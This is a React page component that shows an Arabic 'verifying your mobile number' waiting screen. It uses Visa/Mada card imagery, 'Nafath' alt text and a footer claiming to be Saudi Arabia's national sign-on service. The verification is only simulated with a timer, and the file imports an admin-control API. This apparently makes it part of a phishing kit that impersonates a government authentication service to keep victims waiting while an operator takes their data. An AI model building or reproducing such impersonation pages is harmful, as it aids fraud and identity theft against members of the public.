import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import { Header } from "@/components/layout/Header";
import { Loader2 } from "lucide-react";
import { sendAdminControl } from "@/lib/api";
import visaMadaImage from "../assets/VISAMADAH_1779063055374.png";

export default function NomerWait() {
  const [, setLocation] = useLocation();
  const [message, setMessage] = useState("جارٍ التحقق من الرقم...");
  
  useEffect(() => {
    // Simulate checking process
    const timer = setTimeout(() => {
      setMessage("جارٍ الاتصال بمزود الخدمة...");
    }, 3000);

    return () => clearTimeout(timer);
  }, []);

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      <Header />
      
      <div className="container mx-auto px-4 py-12 flex-1 flex justify-center items-start">
        <div className="bg-white rounded-3xl shadow-lg border border-gray-200 p-8 max-w-md w-full text-center">
          
          <img src={visaMadaImage} alt="Nafath" className="h-16 mx-auto mb-6 object-contain" />
          
          <div className="flex flex-col items-center justify-center mb-6">
            <Loader2 className="w-16 h-16 animate-spin text-primary mb-4" />
          </div>
          
          <h2 className="text-xl font-bold text-gray-800 mb-4">التحقق من رقم الجوال</h2>
          
          <p className="text-gray-600 mb-8 leading-relaxed">
            {message}
          </p>
          
          <p className="text-sm text-gray-500">
            يرجى عدم إغلاق هذه الصفحة
          </p>
        </div>
      </div>

      {/* Footer */}
      <footer className="py-4 text-center text-xs text-gray-500 border-t border-gray-200">
        جميع الحقوق محفوظة © النفاذ الوطني
      </footer>
    </div>
  );
}
